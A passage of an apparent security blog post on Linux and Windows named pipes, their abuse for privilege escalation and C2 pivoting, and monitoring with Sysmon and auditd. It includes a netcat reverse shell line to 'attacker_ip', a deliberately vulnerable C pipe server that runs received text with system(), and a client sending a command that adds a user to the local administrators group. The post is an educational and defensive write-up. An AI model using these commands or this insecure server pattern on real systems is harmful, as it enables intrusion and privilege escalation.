2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 692px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*pQYzUHoS-x7G2Fto.png 640w, https://miro.medium.com/v2/resize:fit:720/0*pQYzUHoS-x7G2Fto.png 720w, https://miro.medium.com/v2/resize:fit:750/0*pQYzUHoS-x7G2Fto.png 750w, https://miro.medium.com/v2/resize:fit:786/0*pQYzUHoS-x7G2Fto.png 786w, https://miro.medium.com/v2/resize:fit:828/0*pQYzUHoS-x7G2Fto.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*pQYzUHoS-x7G2Fto.png 1100w, https://miro.medium.com/v2/resize:fit:1384/0*pQYzUHoS-x7G2Fto.png 1384w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 692px"><img alt="" class="bi gl ou c" width="692" height="318" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:692/0*pQYzUHoS-x7G2Fto.png"></picture></div><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">illustration FIFO from <a class="ah qr" href="https://www.hitchhikersguidetolearning.com/" rel="noopener ugc nofollow" target="_blank">https://www.hitchhikersguidetolearning.com</a></figcaption></figure><p id="f1cd" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Named pipes</strong> in Linux (or <a class="ah qr" href="https://en.wikipedia.org/wiki/Unix_file_types" rel="noopener ugc nofollow" target="_blank">FIFOs</a>) are special files that allow multiple processes to read from and write to them, enabling bidirectional communication. They have attributes like ownership and permissions, just like regular files. You can create a FIFO with commands like <code class="de qs qt qu qv b">mkfifo</code> or <code class="de qs qt qu qv b">mknod</code>. Named pipes can be combined with other commands to create applications, such as a reverse shell using netcat.</p><p id="26d2" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Examples:</strong></p><p id="d2a5" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">netcat reverse shell scenario:<code class="de qs qt qu qv b">/bin/sh -i &lt; /tmp/fifo 2&gt;&amp;1 | nc attacker_ip 4444 &gt; /tmp/fifo)</code></p><p id="f455" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">&lt; /tmp/fifo</code>: This redirects the standard input of the shell to read from the named pipe <code class="de qs qt qu qv b">/tmp/fifo</code>, the shell will read its input from this pipe.</p><p id="a6b8" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">&gt; /tmp/fifo</code>: This redirects the output from <code class="de qs qt qu qv b">nc</code> (which is the input from the attacker's machine) back into the named pipe <code class="de qs qt qu qv b">/tmp/fifo</code>. This means any input from the attacker gets sent back into the shell as if it was typed directly into the shell's input.</p><ul class=""><li id="a4c2" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Anonymous Pipe</strong>: <code class="de qs qt qu qv b">ls | grep txt</code> (Anonymous pipes are created automatically by the shell and are used for inter-process communication (IPC) within the same command line)</li><li id="69ca" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Named Pipe</strong>: <code class="de qs qt qu qv b">mkfifo PrivescPipe_Linux</code>creates a FIFO for shared access (Unlike anonymous pipes, named pipes are created in the filesystem and can be accessed by multiple processes independently)</li></ul><figure class="qx qy qz ra rb op oh oi paragraph-image"><div role="button" tabindex="0" class="oq or fr os bi ot"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="oh oi ro"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T2oegAMxBnh9J9jvsLD2sw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*T2oegAMxBnh9J9jvsLD2sw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*T2oegAMxBnh9J9jvsLD2sw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*T2oegAMxBnh9J9jvsLD2sw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*T2oegAMxBnh9J9jvsLD2sw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*T2oegAMxBnh9J9jvsLD2sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*T2oegAMxBnh9J9jvsLD2sw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*T2oegAMxBnh9J9jvsLD2sw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi gl ou c" width="700" height="127" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*T2oegAMxBnh9J9jvsLD2sw.png"></picture></div></div></figure><p id="c5d3" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">The file has a special type indicated by a<code class="de qs qt qu qv b">p</code> in the permissions (<code class="de qs qt qu qv b">prw-r--r--</code>) in this example, the <code class="de qs qt qu qv b">p</code> indicates that the file is a named pipe (FIFO)</p><p id="9c17" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">write to the pipe: <code class="de qs qt qu qv b">echo “1337” &gt; /root/PrivescPipe_Linux</code></p><p id="7711" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Use <code class="de qs qt qu qv b">find / -type p</code> to find named pipes locations or<code class="de qs qt qu qv b">lsof | grep FIFO</code> to display processes accessing FIFOs. The output includes details such as PID, PPID, user, and permissions.</p><h2 id="cfdf" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">How Named Pipes Work on Windows</h2><h3 id="26cf" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Creation</h3><p id="de0b" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">A server process creates a named pipe using the <code class="de qs qt qu qv b">CreateNamedPipe</code> function, specifying the name, direction (inbound, outbound, or duplex), and other attributes. This function sets up the pipe with the necessary parameters for communication.</p><h3 id="3e7b" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Connection</h3><p id="7d09" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Client processes connect to the pipe using the <code class="de qs qt qu qv b">CreateFile</code> function, specifying the pipe's name. Multiple clients can connect to the same named pipe, enabling one-to-many communication. This flexibility allows various clients to interact with the server through a single communication channel.</p><h3 id="2ede" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Communication</h3><p id="d62f" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Data is read from and written to the pipe using standard file I/O functions like <code class="de qs qt qu qv b">ReadFile</code> and <code class="de qs qt qu qv b">WriteFile</code>. Named pipes support message-oriented communication, ensuring that data is sent and received in discrete units. This method of communication helps in maintaining data integrity and order.</p><ul class=""><li id="1ed2" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Local IPC:</strong> Named pipes are often used for communication between components of a single application or between different applications running on the same machine.</li><li id="01ce" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Remote IPC:</strong> They are also used for communication between applications on different machines over a network, providing a secure and efficient means of data transfer.</li><li id="08ef" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Client-Server Communication:</strong> Named pipes facilitate client-server models, where multiple clients can interact with a server process, commonly seen in database and web server applications.</li></ul><figure class="qx qy qz ra rb op oh oi paragraph-image"><div role="button" tabindex="0" class="oq or fr os bi ot"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="oh oi rw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t6Gba6XcKlwvraR1goIatw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*t6Gba6XcKlwvraR1goIatw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*t6Gba6XcKlwvraR1goIatw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*t6Gba6XcKlwvraR1goIatw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*t6Gba6XcKlwvraR1goIatw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*t6Gba6XcKlwvraR1goIatw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*t6Gba6XcKlwvraR1goIatw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*t6Gba6XcKlwvraR1goIatw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi gl ou c" width="700" height="639" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*t6Gba6XcKlwvraR1goIatw.png"></picture></div></div><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">example illustration</figcaption></figure><h3 id="b16d" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Security</h3><p id="4014" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Named pipes have associated security attributes that control access. When creating a named pipe, the server can specify a security descriptor that defines who can access the pipe and what operations they can perform (read, write, etc.). This ensures that only authorized processes can communicate through the pipe, providing a layer of security.</p><h3 id="5704" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Impersonation</h3><p id="6872" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Named pipes support client impersonation, where the server can assume the security context of the client. This allows for fine-grained access control, enabling the server to <strong class="ox jb">perform actions on behalf of the client with the client’s privileges. </strong>Check out <a class="ah qr" href="https://jsecurity101.medium.com/exploring-impersonation-through-the-named-pipe-filesystem-driver-15f324dfbaf2" rel="noopener">this article</a> from <span class="hl"><span class="bn" role="tooltip" aria-describedby="9" aria-labelledby="9"></span></span></p><div tabindex="-1" class="bf"><a class="rx ry fl" href="https://medium.com/u/78d2ff57ed70?source=post_page---user_mention--a4206e8a4bc8---------------------------------------" rel="noopener" target="_blank">Jonathan Johnson</a></div> to learn ho<strong class="ox jb">w </strong>ImpersonateNamedPipeClient function operates.<p></p><p id="643b" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/daem0nc0re/PrivFu/tree/main/ArtsOfGetSystem/NamedPipeImpersonation" rel="noopener ugc nofollow" target="_blank">Here</a> is a POC exploiting named pipe impersonation for Privilege Escalation, also depending on engagement goals, an attacker might <a class="ah qr" href="https://github.com/S3cur3Th1sSh1t/NamedPipePTH" rel="noopener ugc nofollow" target="_blank">use Pass-the-Hash for authentication on a local Named Pipe</a> for user Impersonation to access a system with specific low-privileged user accounts such as the CEO, HR, SAP administrators, and others.</p><h2 id="c0bb" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">Malicious Use of Named Pipes</h2><p id="ff76" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Modulated Implants<br></strong>Named pipes are used for communication between malicious child processes and the implant core, often in conjunction with keyloggers. This setup allows for efficient data exfiltration and control of compromised systems.</p><p id="06f0" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Privilege Escalation</strong><br>The <a class="ah qr" href="https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all" rel="noopener ugc nofollow" target="_blank">Potato exploits</a> leverages named pipes for privilege escalation. Even Metasploit’s “Get-System” exploit uses named pipes and impersonation to gain elevated privileges on compromised systems. Print Spooler named pipe impersonation tricks associated with multiple vulnerabilities are often used to gain SYSTEM privileges.</p><p id="3eb8" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Persistence</strong><br>C2 implants can listen on a named pipe, providing a persistent backdoor. This method eliminates the need for beacons or open ports, making detection more challenging while maintaining a constant foothold in the compromised system.</p><p id="617d" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">C2 Pivoting with Named Pipes</strong></p><p id="7965" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Named pipes can be exploited for C2 pivoting. Attackers can establish a named pipe on a compromised system and use it to relay commands and data between the attacker-controlled systems and other compromised endpoints within the network. This technique allows for stealthy lateral movement, as named pipes are a legitimate feature of the Windows operating system and can evade some detection mechanisms. Monitoring named pipe creation and communication patterns can help in detecting such malicious activities.</p><p id="5f1a" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">For more information on C2 pivoting using named pipes, check out the following resources:</p><ul class=""><li id="7c66" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://www.cobaltstrike.com/blog/named-pipe-pivoting" rel="noopener ugc nofollow" target="_blank">https://www.cobaltstrike.com/blog/named-pipe-pivoting</a></li><li id="d717" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://havocframework.com/docs/pivoting" rel="noopener ugc nofollow" target="_blank">https://havocframework.com/docs/pivoting</a></li><li id="d33e" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://sliver.sh/docs?name=Pivots" rel="noopener ugc nofollow" target="_blank">https://sliver.sh/docs?name=Pivots</a></li><li id="955e" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-Pbind.ps1" rel="noopener ugc nofollow" target="_blank">https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-Pbind.ps1</a></li><li id="7c87" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html" rel="noopener ugc nofollow" target="_blank">https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html</a></li><li id="8e1c" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://sliver.sh/docs?name=Pivots" rel="noopener ugc nofollow" target="_blank">https://sliver.sh/docs?name=Pivots</a></li></ul><p id="d47e" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">More recently an update in Cobalt Strike 4.10, “Through the BeaconGate,” includes a new technique using named pipes for Beacon’s peer-to-peer communication and allows operators to proxy Beacon’s Windows API calls through a Sleepmask BOF for advanced evasion. This enhances lateral movement capabilities <a class="ah qr" href="https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate" rel="noopener ugc nofollow" target="_blank">https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate</a></p></div></div></div><div class="ac ci rz sa sb sc" role="separator"><span class="sd by bn go se sf"></span><span class="sd by bn go se sf"></span><span class="sd by bn go se"></span></div><div class="ib iu iv iw ix"><div class="ac ci"><div class="cp bi ih ii ij ik"><h2 id="b2b6" class="pq pr ja bg ps pt sg pv gy pw sh py ha pz si qb qc qd sj qf qg qh sk qj qk ql bl" data-selectable-paragraph="">Common Tools and Techniques for Monitoring Named Pipes</h2><ul class=""><li id="1072" class="ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Sysmon:</strong> Microsoft’s Sysmon tool is highly configurable, allowing for detailed logging of named pipe events (connection Event ID 18 + creation Event ID 17). It provides excellent control over verbosity and coverage, making it the best tool for monitoring and detecting suspicious named pipe activities.</li><li id="75a1" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Wireshark:</strong> Wireshark can be used to capture pipe activity within wire data (for SMB smb_pipe.getinfo.pipe_name, or look for the Tree Id in SMB Header)</li><li id="5850" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://www.splunk.com/en_us/blog/security/threat-hunting-stream.html" rel="noopener ugc nofollow" target="_blank">Splunk Stream</a> and <a class="ah qr" href="https://zeek.org/" rel="noopener ugc nofollow" target="_blank">Zeek </a>can also be used to capture pipe activity within wire data, check out this Splunk <a class="ah qr" href="https://www.splunk.com/en_us/blog/security/named-pipe-threats.html" rel="noopener ugc nofollow" target="_blank">article </a>using this data</li><li id="898f" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">EDR:</strong> Some EDR are logging named pipes partially like the EDR Crowdstrike, MDE, Harfanglab or Trellix</li><li id="1c28" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Auditd: </strong>Monitor named pipe creation on Linux using auditd by tracking <code class="de qs qt qu qv b">mknod</code> system calls and <code class="de qs qt qu qv b">execve</code> for command-line patterns. Also, monitor <code class="de qs qt qu qv b">creat</code>, <code class="de qs qt qu qv b">open</code>, and <code class="de qs qt qu qv b">openat</code> for file creation, and <code class="de qs qt qu qv b">splice</code> for detecting <a class="ah qr" href="https://www.elastic.co/security-labs/detecting-and-responding-to-dirty-pipe-with-elastic" rel="noopener ugc nofollow" target="_blank">detect Dirty pipe exploitations</a>)</li></ul><h2 id="3fec" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph=""><strong class="an">Practical Example on Windows</strong></h2><p id="8557" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">In this example, we <strong class="ox jb">create a vulnerable pipe server application</strong> that allows access to all users, regardless of their privilege level.</p><p id="8126" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><em class="sl">This is my </em><strong class="ox jb"><em class="sl">pipe_server.c</em></strong></p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="ce29" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">#include &lt;windows.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;aclapi.h&gt;<br><br>#define PIPE_NAME "\\\\.\\pipe\\PrivEscPipe"<br>#define BUFFER_SIZE 1024<br><br>void main() {<br>    HANDLE hPipe;<br>    char buffer[BUFFER_SIZE];<br>    DWORD bytesRead;<br>    // Define a security descriptor that allows access to everyone<br>    SECURITY_DESCRIPTOR sd;<br>    InitializeSecurityDescriptor(&amp;sd, SECURITY_DESCRIPTOR_REVISION);<br>    SetSecurityDescriptorDacl(&amp;sd, TRUE, NULL, FALSE);<br>    // Define the security attributes structure<br>    SECURITY_ATTRIBUTES sa;<br>    sa.nLength = sizeof(SECURITY_ATTRIBUTES);<br>    sa.lpSecurityDescriptor = &amp;sd;<br>    sa.bInheritHandle = FALSE;<br>    // Create a named pipe<br>    hPipe = CreateNamedPipe(<br>        PIPE_NAME,              // pipe name<br>        PIPE_ACCESS_DUPLEX,     // read/write access<br>        PIPE_TYPE_MESSAGE |     // message type pipe<br>        PIPE_READMODE_MESSAGE | // message-read mode<br>        PIPE_WAIT,              // blocking mode<br>        PIPE_UNLIMITED_INSTANCES, // max. instances<br>        BUFFER_SIZE,            // output buffer size<br>        BUFFER_SIZE,            // input buffer size<br>        0,                      // client time-out<br>        &amp;sa);                   // security attributes<br><br>    if (hPipe == INVALID_HANDLE_VALUE) {<br>        printf("CreateNamedPipe failed, GLE=%d.\n", GetLastError());<br>        return;<br>    }<br>    // Wait for the client to connect<br>    printf("Waiting for client connection...\n");<br>    BOOL connected = ConnectNamedPipe(hPipe, NULL) ?<br>        TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);<br>    if (connected) {<br>        printf("Client connected.\n");<br>        BOOL success = ReadFile(<br>            hPipe,<br>            buffer,              // buffer to receive data<br>            sizeof(buffer) - 1,  // size of buffer<br>            &amp;bytesRead,          // number of bytes read<br>            NULL);               // not overlapped I/O<br>        if (success) {<br>            buffer[bytesRead] = '\0'; // Null-terminate the string<br>            printf("Received: %s\n", buffer);<br>            // execute received command<br>            if (system(buffer) != 0) {<br>                printf("Command execution failed.\n");<br>            }<br>        } else {<br>            printf("ReadFile failed, GLE=%d.\n", GetLastError());<br>        }<br>    } else {<br>        printf("Client connection failed.\n");<br>    }<br>    CloseHandle(hPipe);<br>}</span></pre><p id="63c2" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">and this is my <strong class="ox jb">pipe_client.c</strong>:</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="4906" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">#include &lt;windows.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;string.h&gt;<br><br>#define PIPE_NAME "\\\\.\\pipe\\PrivEscPipe"<br><br>void main() {<br>    HANDLE hPipe;<br>    DWORD bytesWritten, bytesRead;<br>    char exploitCommand[] = "net localgroup administrateurs lowprivuser /add";<br>    // Connect to the named pipe<br>    hPipe = CreateFile(<br>        PIPE_NAME,           // pipe name<br>        GENERIC_READ |       // read and write access<br>        GENERIC_WRITE,<br>        0,                   // no sharing<br>        NULL,                // default security attributes<br>        OPEN_EXISTING,       // opens existing pipe<br>        0,                   // default attributes<br>        NULL);               // no template file<br>    if (hPipe == INVALID_HANDLE_VALUE) {<br>        printf("Failed to connect to pipe, GLE=%d.\n", GetLastError());<br>        return;<br>    }<br>    // Send the command to the server<br>    if (!WriteFile(<br>            hPipe,<br>            exploitCommand,<br>            strlen(exploitCommand),<br>            &amp;bytesWritten,<br>            NULL)) {<br>        printf("WriteFile failed, GLE=%d.\n", GetLastError());<br>    } else {<br>        printf("Sent exploit command to server.\n");<br>    }<br>    CloseHandle(hPipe);<br>}</span></pre><p id="2059" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">After compiling, I executed <code class="de qs qt qu qv b">pipe_server.exe</code> in an elevated terminal, using <a class="ah qr" href="https://github.com/cyberark/PipeViewer" rel="noopener ugc nofollow" target="_blank">PipeViewer</a>, you can check all the pipes opened on your system</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 720w, 